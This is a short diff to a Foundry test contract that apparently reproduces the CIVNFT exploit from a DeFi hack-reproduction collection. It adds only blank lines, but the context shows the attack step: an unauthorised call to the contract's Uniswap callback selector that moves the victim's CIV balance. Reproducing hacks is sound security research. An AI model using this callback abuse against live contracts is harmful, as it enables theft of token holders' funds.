@@ -18,6 +18,7 @@ import "./../interface.sol";
 // Similar incident: https://github.com/SunWeb3Sec/DeFiHackLabs#20230708-civfund---lack-of-access-control
 
 contract CIVNFTTest is Test {
+
     struct Slot0 {
         // the current price
         uint160 sqrtPriceX96;
@@ -112,4 +113,5 @@ contract CIVNFTTest is Test {
         (bool success,) = CIVNFT.call(abi.encodeWithSelector(bytes4(0xd3487997), CIV.balanceOf(victim), 0, data));
         require(success, "Call to Uniswap callback failed");
     }
+
 }
